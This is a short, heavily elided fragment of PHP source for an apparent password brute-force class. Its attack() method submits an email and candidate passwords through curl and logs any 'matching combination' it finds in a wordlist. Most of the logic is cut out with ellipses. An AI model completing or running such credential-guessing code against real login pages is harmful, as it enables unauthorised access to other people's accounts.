...
class BruteForce 
{
	...
	*/
	...
	public function attack()
	{
		...
		{
			self::$data[self::$settings['activity']] = self::$settings['activity'];
			self::$data[self::$settings['email']] = self::$settings['email'];
			...
			$responseArray = curl_getinfo($this->curl);

			$this->logAttack('Found a matching combination (' . self::$settings['email'] . ':' . $f .') in line ' . $l . ' of ' . self::$settings['wordlist'] );
			$this->logAttack(print_r($responseArray, true));
		}	
		curl_close($this->curl);
